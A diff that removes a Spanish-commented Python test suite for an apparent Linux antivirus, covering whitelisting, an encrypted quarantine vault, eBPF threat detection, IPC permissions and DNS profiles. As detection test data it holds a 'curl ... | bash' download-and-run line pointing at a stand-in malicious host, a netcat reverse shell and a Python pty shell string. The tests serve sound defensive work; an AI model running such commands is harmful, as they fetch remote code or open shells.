-        3. Identificación y desalojo inmediato ante modificaciones posteriores a la instalación.
-        4. Validación de procedencia del paquete desde repositorios oficiales firmados.
-        5. Caducidad por TTL y reevaluación de entradas en caché.
-        6. Revocación automática de la lista blanca cuando un archivo autorizado es alterado.
-        7. Registro de decisiones de confianza para auditoría forense.
-        """
-        wl = SystemWhitelist(storage_file=os.path.join(self.tmp, "trust_wl.json"))
-        pie = wl.integrity_engine
-
-        # 1. Verificación de binario legítimo del sistema
-        if os.path.exists("/bin/ls"):
-            pkg, _ = pie.get_dpkg_package_for_file("/bin/ls")
-            self.assertEqual(pkg, "coreutils")
-            self.assertTrue(pie.is_package_installed_ok("coreutils"))
-
-            # Verificación de procedencia de repositorio oficial
-            is_prov, prov_desc = pie.is_package_provenance_trusted("coreutils")
-            self.assertTrue(is_prov)
-            self.assertIn("Repositorio oficial", prov_desc)
-
-            # Debe ser verificado como binario íntegro
-            self.assertTrue(wl.is_trusted_system_binary("/bin/ls"))
-
-        # 2. Binario no registrado en gestor de paquetes debe ser rechazado
-        unregistered = os.path.join(self.tmp, "unregistered_tool.bin")
-        with open(unregistered, "wb") as f:
-            f.write(b"unregistered_binary_payload")
-        self.assertFalse(wl.is_trusted_system_binary(unregistered))
-
-        # 3. Detección de modificaciones posteriores a la instalación (simulación con archivo alterado)
-        pie.cache.clear()
-        with patch.object(pie, "_verify_dpkg_integrity", return_value=(False, "Checksum MD5 ALTERADO", "coreutils")):
-            self.assertFalse(pie.verify_binary("/bin/ls"))
-
-        # 4. Caducidad por TTL de caché
-        pie.cache_ttl = 0.05  # 50 ms
-        st = os.stat("/bin/ls") if os.path.exists("/bin/ls") else None
-        if st:
-            pie._insert_cache((st.st_dev, st.st_ino), st, True, "coreutils", "test_cache")
-            self.assertTrue(pie.cache[(st.st_dev, st.st_ino)]["is_valid"])
-            time.sleep(0.06)
-            now = time.time()
-            self.assertGreater(now - pie.cache[(st.st_dev, st.st_ino)]["cached_at"], pie.cache_ttl)
-
-        # 5. Revocación automática de la lista blanca ante alteración de archivo de usuario
-        user_tool = os.path.join(self.tmp, "custom_script.sh")
-        with open(user_tool, "w") as f:
-            f.write("echo valid_tool\n")
-        self.assertTrue(wl.add_path(user_tool))
-        self.assertTrue(wl.is_whitelisted(user_tool))
-
-        # Alterar archivo en disco
-        with open(user_tool, "a") as f:
-            f.write("curl http://malicious.org/bot.sh | bash\n")
-
-        # is_whitelisted debe detectar la alteración, devolver False Y eliminarlo de la lista blanca
-        self.assertFalse(wl.is_whitelisted(user_tool))
-        self.assertNotIn(os.path.realpath(user_tool), wl.user_whitelisted_paths)
-
-        # 6. Bitácora de decisiones de confianza
-        decisions = wl.get_trust_decisions()
-        self.assertGreater(len(decisions), 0)
-        self.assertTrue(any(d["decision"] in ("ALLOWED", "DENIED") for d in decisions))
-        revoked = wl.get_revoked_entries()
-        self.assertGreater(len(revoked), 0)
-        self.assertTrue(any(r["decision"] == "DENIED" for r in revoked))
-
-    def test_whitelist_metadata_and_audit(self):
-        """Verifica que la lista blanca mantenga metadatos y trazabilidad en AuditLogger."""
-        test_script = os.path.join(self.tmp, "audited_app.sh")
-        with open(test_script, "w") as f:
-            f.write("echo 'hello'")
-        self.assertTrue(self.whitelist.add_path(test_script, reason="Dev testing", user="tester"))
-        entries = self.whitelist.list_entries()
-        matching = [e for e in entries if e["path"] == os.path.realpath(test_script)]
-        self.assertEqual(len(matching), 1)
-        self.assertEqual(matching[0]["reason"], "Dev testing")
-
-
-    # =========================================================================
-    # 5. PRUEBAS CRIPTOGRÁFICAS DEL BAÚL (AES-256-GCM Y ZERO XOR)
-    # =========================================================================
-    def test_vault_quarantine_and_restore(self):
-        fpath = os.path.join(self.tmp, "sample.sh")
-        test_payload = b"#!/bin/bash\necho 'malware payload'\n"
-        with open(fpath, "wb") as f: f.write(test_payload)
-
-        vid = self.vault.quarantine_file(fpath, "Malware.Test")
-        self.assertIsNotNone(vid)
-        self.assertFalse(os.path.exists(fpath))
-
-        # Restaurar muestra
-        self.assertTrue(self.vault.restore_file(vid, destination_path=fpath))
-        self.assertTrue(os.path.exists(fpath))
-        with open(fpath, "rb") as f:
-            restored_payload = f.read()
-        self.assertEqual(restored_payload, test_payload)
-
-    def test_vault_tamper_rejection(self):
-        """Verifica que si los datos cifrados o el Auth Tag son alterados, se rechace la restauración."""
-        fpath = os.path.join(self.tmp, "tamper_test.bin")
-        with open(fpath, "wb") as f: f.write(b"datos_criticos_de_prueba")
-        vid = self.vault.quarantine_file(fpath, "Malware.Tamper")
-
-        payload_path = os.path.join(self.vault.payloads_dir, f"{vid}.quar")
-        self.assertTrue(os.path.exists(payload_path))
-
-        # Alterar un byte del ciphertext/AuthTag
-        os.chmod(payload_path, 0o600)
-        with open(payload_path, "r+b") as f:
-            data = bytearray(f.read())
-            data[-4] ^= 0xAA # Invertir bits en el Auth Tag
-            f.seek(0)
-            f.write(data)
-        os.chmod(payload_path, 0o000)
-
-        # La restauración DEBE fallar y no devolver bytes corruptos
-        restored = self.vault.restore_file(vid, destination_path=fpath)
-        self.assertFalse(restored, "Fallo criptográfico: Carga con Auth Tag corrupto fue aceptada.")
-        self.assertFalse(os.path.exists(fpath))
-
-    def test_vault_streaming_chunked_large_file_and_key_recovery(self):
-        """Verifica cifrado por bloques de 64 KB en streaming y exportación de recuperación de claves."""
-        # Archivo de múltiples bloques (>150 KB para abarcar varios chunks de 64 KB)
-        large_fpath = os.path.join(self.tmp, "large_sample.bin")
-        large_payload = b"A" * (64 * 1024) + b"B" * (64 * 1024) + b"C" * (10 * 1024)
-        with open(large_fpath, "wb") as f:
-            f.write(large_payload)
-
-        vid = self.vault.quarantine_file(large_fpath, "Malware.LargeStream")
-        self.assertIsNotNone(vid)
-        self.assertFalse(os.path.exists(large_fpath))
-
-        # Comprobar formato streaming en disco (cabecera CST_AES256GCM_S:)
-        quar_file = os.path.join(self.vault.payloads_dir, f"{vid}.quar")
-        os.chmod(quar_file, 0o600)
-        with open(quar_file, "rb") as f:
-            header = f.read(17)
-        os.chmod(quar_file, 0o000)
-        self.assertIn(header, (b"CST_AES256GCM_V3:", b"CST_AES256GCM_S:"))
-
-        # Restauración en streaming y validación de coincidencia exacta byte a byte
-        restored = self.vault.restore_file(vid, destination_path=large_fpath)
-        self.assertTrue(restored)
-        self.assertTrue(os.path.exists(large_fpath))
-        with open(large_fpath, "rb") as f:
-            restored_bytes = f.read()
-        self.assertEqual(restored_bytes, large_payload)
-
-        # Probar exportación e importación de paquete de recuperación de clave
-        recovery_pkg = os.path.join(self.tmp, "key_recovery.json")
-        self.assertTrue(self.vault.export_key_recovery_package(recovery_pkg))
-        self.assertTrue(os.path.exists(recovery_pkg))
-
-        # Probar que un archivo de clave corrupto NO se sobrescribe silenciosamente
-        corrupt_key_file = os.path.join(self.tmp, "corrupt_key.key")
-        with open(corrupt_key_file, "wb") as kf:
-            kf.write(b"short_corrupt_data")
-        # Debe lanzar excepción y rehusar inicializarse con datos corruptos
-        with self.assertRaises(ValueError):
-            QuarantineVault(storage_dir=self.tmp, key_file=corrupt_key_file)
-
-    def test_export_key_recovery_package_security_o02(self):
-        """
-        Verifica los controles de seguridad criptográfica y del sistema de archivos en O-02:
-        1. Permisos restrictivos (0400) desde la creación en el inodo (sin ventana TOCTOU).
-        2. Creación exclusiva (O_CREAT | O_EXCL) y rechazo si el archivo ya existe sin overwrite=True.
-        3. Protección estricta contra enlaces simbólicos (rechazo de symlinks en destino y en directorio).
-        4. Verificación de manipulación por usuarios no privilegiados (rechazo de directorios world-writable sin sticky bit).
-        5. Importación validada del paquete de recuperación y protección contra enlaces en importación.
-        """
-        recovery_pkg = os.path.join(self.tmp, "o02_recovery_test.json")
-
-        # 1. Creación exitosa y verificación de permisos 0400 desde su creación
-        success = self.vault.export_key_recovery_package(recovery_pkg)
-        self.assertTrue(success)
-        self.assertTrue(os.path.exists(recovery_pkg))
-        st = os.stat(recovery_pkg)
-        self.assertEqual(st.st_mode & 0o777, 0o400, "El paquete exportado debe crearse con permisos estrictos 0400")
-
-        # Verificar contenido JSON
-        with open(recovery_pkg, "r", encoding="utf-8") as f:
-            data = json.load(f)
-        self.assertEqual(data.get("format"), "Constantine-Vault-KeyRecovery-v2")
-        self.assertEqual(data.get("cipher"), "AES-256-GCM-Chunked-AEAD")
-        self.assertTrue(bool(data.get("key_hex")))
-        self.assertTrue(bool(data.get("key_sha256")))
-
-        # 2. Creación exclusiva: Si ya existe y overwrite=False, debe fallar (O_EXCL)
-        self.assertFalse(self.vault.export_key_recovery_package(recovery_pkg, overwrite=False))
-
-        # Con overwrite=True debe sobreescribir de forma segura
-        self.assertTrue(self.vault.export_key_recovery_package(recovery_pkg, overwrite=True))
-        self.assertEqual(os.stat(recovery_pkg).st_mode & 0o777, 0o400)
-
-        # 3. Protección contra enlaces simbólicos: Rechazo si el destino es un symlink
-        symlink_target = os.path.join(self.tmp, "symlink_attack.json")
-        decoy_file = os.path.join(self.tmp, "decoy.txt")
-        with open(decoy_file, "w") as df:
-            df.write("DECOY_UNTOUCHED")
-        os.symlink(decoy_file, symlink_target)
-
-        # Debe ser rechazado categóricamente
-        self.assertFalse(self.vault.export_key_recovery_package(symlink_target, overwrite=False))
-        self.assertFalse(self.vault.export_key_recovery_package(symlink_target, overwrite=True))
-
-        # Verificar que el señuelo no fue sobreescrito ni tocado
-        with open(decoy_file, "r") as df:
-            self.assertEqual(df.read(), "DECOY_UNTOUCHED")
-
-        # 4. Protección contra enlaces simbólicos en el directorio padre
-        sym_dir = os.path.join(self.tmp, "sym_dir")
-        real_dir = os.path.join(self.tmp, "real_dir")
-        os.makedirs(real_dir, exist_ok=True)
-        os.symlink(real_dir, sym_dir)
-        self.assertFalse(self.vault.export_key_recovery_package(os.path.join(sym_dir, "export.json")))
-
-        # 5. Protección contra directorios modificables por usuarios no privilegiados sin sticky bit
-        insecure_dir = os.path.join(self.tmp, "insecure_world_writable_dir")
-        os.makedirs(insecure_dir, exist_ok=True)
-        os.chmod(insecure_dir, 0o777)
-        self.assertFalse(self.vault.export_key_recovery_package(os.path.join(insecure_dir, "key.json")))
-
-        # Con sticky bit (0o1777, ej: /tmp), debe ser admitido
-        os.chmod(insecure_dir, 0o1777)
-        self.assertTrue(self.vault.export_key_recovery_package(os.path.join(insecure_dir, "key.json")))
-
-        # 6. Importación validada
-        imported = self.vault.import_key_recovery_package(recovery_pkg)
-        self.assertTrue(imported)
-
-        # Importación de enlace simbólico debe ser rechazada
-        self.assertFalse(self.vault.import_key_recovery_package(symlink_target))
-
-    def test_privileged_quarantine_operator_descriptor_pinning_and_toctou_rejection(self):
-        """Verifica que PrivilegedQuarantineOperator fije descriptores, detecte enlaces simbólicos y rechace TOCTOU."""
-        op = PrivilegedQuarantineOperator()
-        sample_path = os.path.join(self.tmp, "test_operator_sample.bin")
-        with open(sample_path, "wb") as f:
-            f.write(b"datos_de_prueba_operador_cuarentena_12345")
-
-        # 1. Fijación de descriptor y validación estándar
-        handle = op.pin_and_validate(sample_path)
-        self.assertIsNotNone(handle)
-        self.assertGreaterEqual(handle.fd, 0)
-        self.assertEqual(handle.size_bytes, len(b"datos_de_prueba_operador_cuarentena_12345"))
-        self.assertTrue(len(handle.sha256) == 64)
-        handle.close()
-
-        # 2. Rechazo estricto de ataques con enlaces simbólicos (Anti-Symlink TOCTOU)
-        symlink_path = os.path.join(self.tmp, "symlink_malicioso.bin")
-        if os.path.exists(symlink_path):
-            os.remove(symlink_path)
-        os.symlink(sample_path, symlink_path)
-        with self.assertRaises(PermissionError):
-            op.pin_and_validate(symlink_path)
-        os.remove(symlink_path)
-
-        # 3. Rechazo de rutas de kernel protegidas (/proc, /sys, /dev)
-        with self.assertRaises(PermissionError):
-            op.pin_and_validate("/proc/version")
-
-        # 4. Reutilización segura de descriptor existente (target_fd)
-        fd = os.open(sample_path, os.O_RDONLY | os.O_CLOEXEC)
-        handle2 = op.pin_and_validate(sample_path, target_fd=fd)
-        os.close(fd)
-        self.assertEqual(handle2.sha256, handle.sha256)
-        self.assertTrue(handle2.is_cloned_fd)
-        handle2.close()
-
-    def test_quarantine_with_descriptor_and_read_only_fs_resilience(self):
-        """Verifica que quarantine_file acepte target_fd y soporte medios de solo lectura (EROFS) sin perder la muestra."""
-        fpath = os.path.join(self.tmp, "quar_ro_test.bin")
-        with open(fpath, "wb") as f:
-            f.write(b"payload_hostil_para_aislar_en_medio_ro")
-
-        fd = os.open(fpath, os.O_RDONLY | os.O_CLOEXEC)
-        # 1. Cuarentena con target_fd explícito
-        vid = self.vault.quarantine_file(fpath, "Trojan.ROTest", detected_by="TestDescriptor", target_fd=fd)
-        os.close(fd)
-        self.assertIsNotNone(vid)
-        self.assertFalse(os.path.exists(fpath))
-
-        # 2. Simulación de sistema de archivos de solo lectura (EROFS)
-        fpath_ro = os.path.join(self.tmp, "quar_ro_mount_test.bin")
-        with open(fpath_ro, "wb") as f:
-            f.write(b"payload_en_filesystem_de_solo_lectura")
-
-        with patch.object(self.vault.operator, "secure_unlink", return_value=(False, True, "Sistema de archivos de solo lectura (EROFS)")):
-            vid_ro = self.vault.quarantine_file(fpath_ro, "Rootkit.ReadOnlyFS", detected_by="TestRO")
-            self.assertIsNotNone(vid_ro)
-            # El archivo original se mantiene por ser de solo lectura, pero la muestra queda aislada en el baúl
-            items = self.vault.list_items()
-            ro_item = next((it for it in items if it["vault_id"] == vid_ro), None)
-            self.assertIsNotNone(ro_item)
-            self.assertEqual(ro_item.get("quarantine_mode"), "isolated_in_vault_ro_fs")
-            self.assertFalse(ro_item.get("original_removed"))
-
-    def test_vault_v3_96bit_nonces_and_collision_freedom(self):
-        """Verifica que generate_unique_nonce_96 genere nonces de 12 bytes (96 bits) libres de colisiones bajo concurrencia."""
-        from concurrent.futures import ThreadPoolExecutor
-
-        vault = QuarantineVault(storage_dir=os.path.join(self.tmp, "vault_concurrent"))
-        num_nonces = 2000
-
-        def get_nonce(_):
-            return vault.generate_unique_nonce_96()
-
-        with ThreadPoolExecutor(max_workers=8) as executor:
-            nonces = list(executor.map(get_nonce, range(num_nonces)))
-
-        self.assertEqual(len(nonces), num_nonces)
-        # Verificar unicidad absoluta (cero colisiones)
-        self.assertEqual(len(set(nonces)), num_nonces)
-        # Verificar longitud exacta de 96 bits (12 bytes)
-        for n in nonces:
-            self.assertEqual(len(n), 12)
-
-    def test_vault_key_volume_control_and_rotation(self):
-        """Verifica control de límites de uso por clave, rotación automática y keyring histórico."""
-        vault = QuarantineVault(storage_dir=os.path.join(self.tmp, "vault_rotation"))
-        vault.max_key_usage_limit = 10  # Límite bajo para prueba
-
-        initial_key_id = vault.key_id
-        initial_key = vault._aes_key
-
-        # Generar nonces hasta superar el límite
-        for _ in range(15):
-            vault.generate_unique_nonce_96()
-
-        # Debe haberse ejecutado la rotación de clave
-        self.assertNotEqual(vault.key_id, initial_key_id)
-        self.assertNotEqual(vault._aes_key, initial_key)
-        self.assertIn(initial_key_id, vault.keyring)
-        self.assertEqual(vault.keyring[initial_key_id], initial_key)
-
-    def test_vault_format_v3_v2_v1_cross_version_decryption(self):
-        """Verifica descifrado transparente entre versiones V3 (96-bit), V2 (64-bit base) y V1 (monolítico)."""
-        vault = QuarantineVault(storage_dir=os.path.join(self.tmp, "vault_versions"))
-        sample_data = b"Contenido confidencial de prueba multiversion para baul Constantine"
-
-        # 1. Cifrado nativo V3 (actual)
-        src_v3 = os.path.join(self.tmp, "sample_v3.bin")
-        enc_v3 = os.path.join(self.tmp, "sample_v3.quar")
-        dec_v3 = os.path.join(self.tmp, "sample_v3_dec.bin")
-        with open(src_v3, "wb") as f:
-            f.write(sample_data)
-
-        self.assertTrue(vault.encrypt_file_streaming(src_v3, enc_v3))
-        self.assertTrue(vault.decrypt_file_streaming(enc_v3, dec_v3))
-        with open(dec_v3, "rb") as f:
-            self.assertEqual(f.read(), sample_data)
-
-        # 2. Simular archivo en formato V2 (CST_AES256GCM_S:)
-        enc_v2 = os.path.join(self.tmp, "sample_v2.quar")
-        dec_v2 = os.path.join(self.tmp, "sample_v2_dec.bin")
-        import secrets
-        import struct
-        from cryptography.hazmat.primitives.ciphers.aead import AESGCM
-        aesgcm = AESGCM(vault._aes_key)
-        base_nonce_v2 = secrets.token_bytes(8)
-        block_nonce_v2 = base_nonce_v2 + struct.pack(">I", 0)
-        block_aad_v2 = b"CST_CHUNK:" + struct.pack(">IB", 0, 1)
-        ciphertext_v2 = aesgcm.encrypt(block_nonce_v2, sample_data, block_aad_v2)
-
-        with open(enc_v2, "wb") as f:
-            f.write(b"CST_AES256GCM_S:")
-            f.write(base_nonce_v2)
-            f.write(struct.pack(">Q", len(sample_data)))
-            f.write(struct.pack(">IB", len(ciphertext_v2), 1))
-            f.write(ciphertext_v2)
-
-        self.assertTrue(vault.decrypt_file_streaming(enc_v2, dec_v2))
-        with open(dec_v2, "rb") as f:
-            self.assertEqual(f.read(), sample_data)
-
-        # 3. Simular archivo en formato V1 (CST_AES256GCM:)
-        enc_v1 = os.path.join(self.tmp, "sample_v1.quar")
-        dec_v1 = os.path.join(self.tmp, "sample_v1_dec.bin")
-        nonce_v1 = secrets.token_bytes(12)
-        ciphertext_v1 = aesgcm.encrypt(nonce_v1, sample_data, None)
-        with open(enc_v1, "wb") as f:
-            f.write(b"CST_AES256GCM:")
-            f.write(nonce_v1)
-            f.write(ciphertext_v1)
-
-        self.assertTrue(vault.decrypt_file_streaming(enc_v1, dec_v1))
-        with open(dec_v1, "rb") as f:
-            self.assertEqual(f.read(), sample_data)
-
-    def test_scanner_update_signatures_syncs_feeds_real(self):
-        """Verifica que update_signatures invoque sync_feeds y refleje resultados reales."""
-        res = self.scanner.update_signatures(sync_remote=False)
-        self.assertIn("yara_reloaded", res)
-        self.assertIn("feed_sync", res)
-
-    # =========================================================================
-    # 6. PRUEBAS DE EBPF Y CENTINELA DE RESCATE
-    # =========================================================================
-    def test_ebpf_status_and_fallback(self):
-        monitor = EBPFMonitor()
-        status_info = monitor.get_status_info()
-        self.assertIn("status", status_info)
-        self.assertIn("recommendation", status_info)
-        self.assertIn("operational_label", status_info)
-        self.assertIn("monitored_vectors", status_info)
-
-        # Iniciar monitor
-        monitor.start()
-        # Debe ser operativo (ya sea mediante kernel BCC o centinela de rescate /proc)
-        self.assertTrue(monitor.is_operational())
-        info = monitor.get_status_info()
-        # Debe reflejar claramente si está en modo degradado o nativo
-        if monitor.is_degraded():
-            self.assertEqual(info["mode"], "DEGRADED_USERSPACE_POLLER")
-            self.assertEqual(info["operational_label"], "MODO DEGRADADO (ESPACIO DE USUARIO)")
-        elif monitor.is_active():
-            self.assertIn(info["mode"], ("EBPF_KERNEL_PROBES", "BPF_LSM_ENFORCING"))
-        monitor.stop()
-
-    def test_ebpf_kill_offender(self):
-        monitor = EBPFMonitor(auto_kill=True)
-        # Test safe boundary check: PID 1 or <= 0 never killed
-        self.assertFalse(monitor.kill_offender(0, "Test", "safe_check"))
-        self.assertFalse(monitor.kill_offender(1, "Test", "safe_check"))
-
-    def test_ebpf_netcat_benign_vs_hostile_discrimination(self):
-        """Verifica que Netcat legítimo (ej. -zv, -l) no sea clasificado como amenaza y solo se bloqueen reverse shells."""
-        monitor = EBPFMonitor()
-
-        # 1. Uso legítimo de administración de redes (BENIGNO)
-        is_threat, _ = monitor.evaluate_execution_threat("nc", "/usr/bin/nc", "nc -zv 192.168.1.1 80")
-        self.assertFalse(is_threat, "Falso positivo: escaneo legítimo de puertos con nc no debe ser bloqueado")
-
-        is_threat, _ = monitor.evaluate_execution_threat("netcat", "/usr/bin/netcat", "netcat -l -p 8080")
-        self.assertFalse(is_threat, "Falso positivo: netcat listener en puerto local no debe ser bloqueado")
-
-        # 2. Uso malicioso de Netcat con banderas de ejecución de shell (HOSTIL)
-        is_threat, threat = monitor.evaluate_execution_threat("nc", "/usr/bin/nc", "nc 10.0.0.1 4444 -e /bin/bash")
-        self.assertTrue(is_threat)
-        self.assertEqual(threat, "Exploit.ReverseShell.Netcat")
-
-        # 3. Binario Netcat dropeado en /tmp
-        is_threat, threat = monitor.evaluate_execution_threat("nc", "/tmp/nc", "/tmp/nc 1.2.3.4 9999")
-        self.assertTrue(is_threat)
-        self.assertIn("UntrustedDirExecution", threat)
-
-    def test_ebpf_multi_argument_reverse_shell_detection(self):
-        """Verifica que argumentos situados más allá de argv[1] sean analizados correctamente."""
-        monitor = EBPFMonitor()
-
-        # Shell reversa Python donde los argumentos críticos están al final
-        args_deep = 'python3 -u -O -c "import socket,os,pty; s=socket.socket(); pty.spawn(\'/bin/sh\')"'
-        is_threat, threat = monitor.evaluate_execution_threat("python3", "/usr/bin/python3", args_deep)
-        self.assertTrue(is_threat)
-        self.assertEqual(threat, "Exploit.ReverseShell.PythonPty")
-    def test_ebpf_event_lifecycle_states(self):
-        """Verifica que EBPFMonitor maneje los estados explícitos de ciclo de vida sin confundir alerta con bloqueo."""
-        monitor = EBPFMonitor(auto_kill=False)
-        # 1. Proceso inválido o no existente
-        st_invalid = monitor.contain_and_terminate_process(1, "Threat", "init_guard")
-        self.assertEqual(st_invalid, EBPFEventState.ACTION_FAILED)
-
-        # 2. Comprobar que los estados definidos cubran el ciclo de vida
-        self.assertIn(EBPFEventState.EVENT_OBSERVED, EBPFEventState)
-        self.assertIn(EBPFEventState.SUSPICIOUS_ACTIVITY, EBPFEventState)
-        self.assertIn(EBPFEventState.THREAT_CONFIRMED, EBPFEventState)
-        self.assertIn(EBPFEventState.PROCESS_CONTAINED, EBPFEventState)
-        self.assertIn(EBPFEventState.PROCESS_TERMINATED, EBPFEventState)
-        self.assertIn(EBPFEventState.ACTION_FAILED, EBPFEventState)
-
-        # 3. Reporte de estado cuando BCC no está disponible
-        info = monitor.get_status_info()
-        self.assertIn("status", info)
-        self.assertIn("recommendation", info)
-
-    def test_ebpf_architecture_tracepoints_vs_lsm_separation(self):
-        """
-        Verifica la arquitectura eBPF P0:
-        1. Separación estricta de Tracepoints (observación) y BPF LSM (enforcement).
-        2. Comprobación de capacidades reales del kernel (BTF, CO-RE, LSM, backend).
-        3. No anunciar BPF LSM cuando solo se observan llamadas al sistema.
-        4. Detección y métricas de pérdida de eventos (lost_events_count).
-        5. Administración de mapas con límites estrictos de memoria y purgado TTL.
-        6. Desactivación modular selectiva de funciones incompatibles.
-        """
-        monitor = EBPFMonitor(enable_lsm=True, max_intents_entries=10, max_incidents_history=5)
-
-        # 1. Comprobación de capacidades del kernel
-        caps = monitor.probe_kernel_capabilities()
-        self.assertIn("has_root", caps)
-        self.assertIn("has_btf", caps)
-        self.assertIn("has_co_re", caps)
-        self.assertIn("has_bpf_lsm_kernel", caps)
-        self.assertIn("backend", caps)
-
-        # 2. Separación estricta: si no hay BPF LSM en el kernel, nunca debe fingirse BPF_LSM_ENFORCING
-        info = monitor.get_status_info()
-        self.assertIn("monitoring_status", info)
-        self.assertIn("lsm_status", info)
-        self.assertIn("has_bpf_lsm", info)
-        self.assertIn("has_bpf_lsm_enforcement", info)
-        self.assertIn("attached_probes", info)
-        self.assertIn("attached_lsm_hooks", info)
-        self.assertIn("memory_limits", info)
-
-        # Si el kernel no soporta BPF LSM, has_bpf_lsm debe ser estrictamente False
-        if not caps["has_bpf_lsm_kernel"]:
-            self.assertFalse(info["has_bpf_lsm"])
-            self.assertFalse(info["has_bpf_lsm_enforcement"])
-            self.assertNotEqual(info["mode"], "BPF_LSM_ENFORCING")
-
-        # 3. Detección de pérdida de eventos (lost_cb)
-        self.assertEqual(monitor.lost_events_count, 0)
-        monitor._on_lost_events(cpu=1, lost=7)
-        self.assertEqual(monitor.lost_events_count, 7)
-        self.assertEqual(monitor.get_status_info()["lost_events_count"], 7)
-
-        # 4. Administración de memoria en mapas de intención (límite y purgado TTL)
-        for i in range(15):
-            monitor.record_file_intent(
-                pid=2000 + i,
-                target_path=f"/tmp/test_intent_{i}.bin",
-                flags=os.O_WRONLY,
-                is_write=True,
-                is_read=False
-            )
-        # La capacidad debe mantenerse acotada a max_intents_entries
-        self.assertLessEqual(len(monitor.file_intents), 25) # cada intent guarda clave (pid, path) y (pid, basename)
-
-        # 5. Gestión del historial de incidentes con límite de memoria
-        from core.engine.ebpf_monitor import EBPFIncident
-        for j in range(10):
-            monitor._add_incident(EBPFIncident(
-                pid=3000 + j,
-                comm="test",
-                target_path=f"/tmp/inc_{j}",
-                threat_name="TestThreat",
-                state=EBPFEventState.EVENT_OBSERVED
-            ))
-        self.assertLessEqual(len(monitor.incidents_history), 5)
-
-        # 6. Intentar enforcement BPF LSM cuando no está disponible debe fallar limpiamente
-        self.assertFalse(monitor.block_pid_in_lsm(9999))
-        self.assertFalse(monitor.unblock_pid_in_lsm(9999))
-
-
-    # =========================================================================
-    # 7. PRUEBAS DE SERVICIOS AUXILIARES
-    # =========================================================================
-    def test_auth_native_system(self):
-        user = self.auth.get_current_user()
-        self.assertIsNotNone(user)
-        token = "test_valid_token_123"
-        self.auth.active_sessions[token] = 9999999999.0
-        self.assertTrue(self.auth.is_session_valid(token))
-        self.auth.revoke_session(token)
-        self.assertFalse(self.auth.is_session_valid(token))
-
-    def test_ipc_rbac_policy_matrix(self):
-        """Verifica la matriz de permisos RBAC: operaciones de usuario vs administrativas."""
-        from core.engine.ipc_protocol import is_operation_permitted
-
-        # Operaciones permitidas a usuario normal
-        self.assertTrue(is_operation_permitted("GET_STATUS", is_admin=False))
-        self.assertTrue(is_operation_permitted("GET_THREATS", is_admin=False))
-        self.assertTrue(is_operation_permitted("GET_SHIELDS_HEALTH", is_admin=False))
-        self.assertTrue(is_operation_permitted("GET_AUDIT_LOGS", is_admin=False))
-        self.assertTrue(is_operation_permitted("REQUEST_SCAN", is_admin=False))
-
-        # Operaciones administrativas restringidas a usuario normal
-        self.assertFalse(is_operation_permitted("ADD_WHITELIST", is_admin=False))
-        self.assertFalse(is_operation_permitted("REMOVE_WHITELIST", is_admin=False))
-        self.assertFalse(is_operation_permitted("TOGGLE_SHIELD", is_admin=False))
-        self.assertFalse(is_operation_permitted("PURGE_QUARANTINE", is_admin=False))
-        self.assertFalse(is_operation_permitted("APPLY_DNS_PROFILE", is_admin=False))
-
-        # El administrador puede ejecutar todas las operaciones
-        self.assertTrue(is_operation_permitted("ADD_WHITELIST", is_admin=True))
-        self.assertTrue(is_operation_permitted("TOGGLE_SHIELD", is_admin=True))
-        self.assertTrue(is_operation_permitted("PURGE_QUARANTINE", is_admin=True))
-
-    def test_ipc_server_side_authorization_enforcement(self):
-        """Verifica que el servidor IPC aplique validación estricta en el servidor y rechace comandos no autorizados."""
-        from core.engine.ipc_protocol import SecureIPCDaemonServer, SecureIPCClient
-        from core.auth.auth_manager import AuthManager
-
-        sock_path = os.path.join(self.tmp, "rbac_test.sock")
-        auth = AuthManager()
-        admin_token = "valid_admin_token_test_123"
-        auth.active_sessions[admin_token] = time.time() + 900
-
-        def dummy_handler(cmd, params, uid, is_admin):
-            return "OK", {"echo": cmd, "is_admin": is_admin}, ""
-
-        # Servidor con validación en background
-        server = SecureIPCDaemonServer(socket_path=sock_path, command_handler=dummy_handler, auth_manager=auth)
-        server.start(background=True)
-        time.sleep(0.05)
-
-        client = SecureIPCClient(socket_path=sock_path)
-
-        # 1. Comando de consulta sin token (permitido a usuario normal)
-        resp1 = client.send_command("GET_STATUS")
-        self.assertEqual(resp1.get("status"), "OK")
-
-        # 2. Comando administrativo sin token de administrador (debe ser rechazado por el servidor)
-        with patch.object(server, "verify_peer_credentials", return_value=(True, 1234, 1000, 1000)):
-            resp2 = client.send_command("ADD_WHITELIST", params={"path": "/tmp/test"})
-            self.assertEqual(resp2.get("status"), "FORBIDDEN")
-            self.assertIn("requiere autorización administrativa", resp2.get("error", ""))
-
-        # 3. Comando administrativo con token de sesión de administrador válido (debe ser aceptado)
-        with patch.object(server, "verify_peer_credentials", return_value=(True, 1234, 1000, 1000)):
-            resp3 = client.send_command("ADD_WHITELIST", params={"path": "/tmp/test"}, token=admin_token)
-            self.assertEqual(resp3.get("status"), "OK")
-            self.assertTrue(resp3.get("data", {}).get("is_admin"))
-
-        server.stop()
-
-    def test_phishing(self):
-        self.assertFalse(self.phishing.analyze_url("https://google.com").is_phishing)
-        self.assertTrue(self.phishing.analyze_url("http://g00gle-verify.xyz/account").is_phishing)
-        self.assertTrue(self.phishing.analyze_url("http://192.168.1.1/confirm-banking").is_phishing)
-
-    def test_dns_manager(self):
-        """Verifica perfiles DNS, soporte DoT, y que la aplicación valide el estado real sin falsos éxitos."""
-        dm = DNSManager(state_file=os.path.join(self.tmp, "dns_state.json"))
-        profiles = dm.get_profiles()
-        self.assertIn("mullvad-base", profiles)
-        self.assertIn("quad9-partner", profiles)
-        self.assertIn("dot", profiles["mullvad-base"])
-        self.assertIn("doh", profiles["mullvad-base"])
-
-        # 1. Comprobar que si la configuración del sistema falla, apply_profile retorne False (sin falsos positivos)
-        with patch.object(dm, "_apply_via_resolvectl", return_value=False):
-            with patch.object(dm, "_apply_via_resolv_conf", return_value=False):
-                res_fail = dm.apply_profile("mullvad-base")
-                self.assertFalse(res_fail)
-
-        # 2. Comprobar aplicación exitosa verificada (resolvectl / resolved con DoT)
-        target_profile = profiles["mullvad-adblock"]
-        with patch.object(dm, "_apply_via_resolvectl", return_value=True):
-            with patch.object(dm, "detect_real_system_dns", return_value=target_profile["ipv4"]):
-                applied = dm.apply_profile("mullvad-adblock")
-                self.assertTrue(applied)
-                active = dm.get_active_profile()
-                self.assertEqual(active["id"], "mullvad-adblock")
-
+        self.temp_dir.cleanup()
+
+    # 1. Archive Sentinel
+    def test_archive_sentinel_recursive_inspection_and_zipbomb_protection(self):
+        sentinel = ArchiveSentinel(max_ratio=100.0, max_files=10)
+        # Test zip bomb ratio
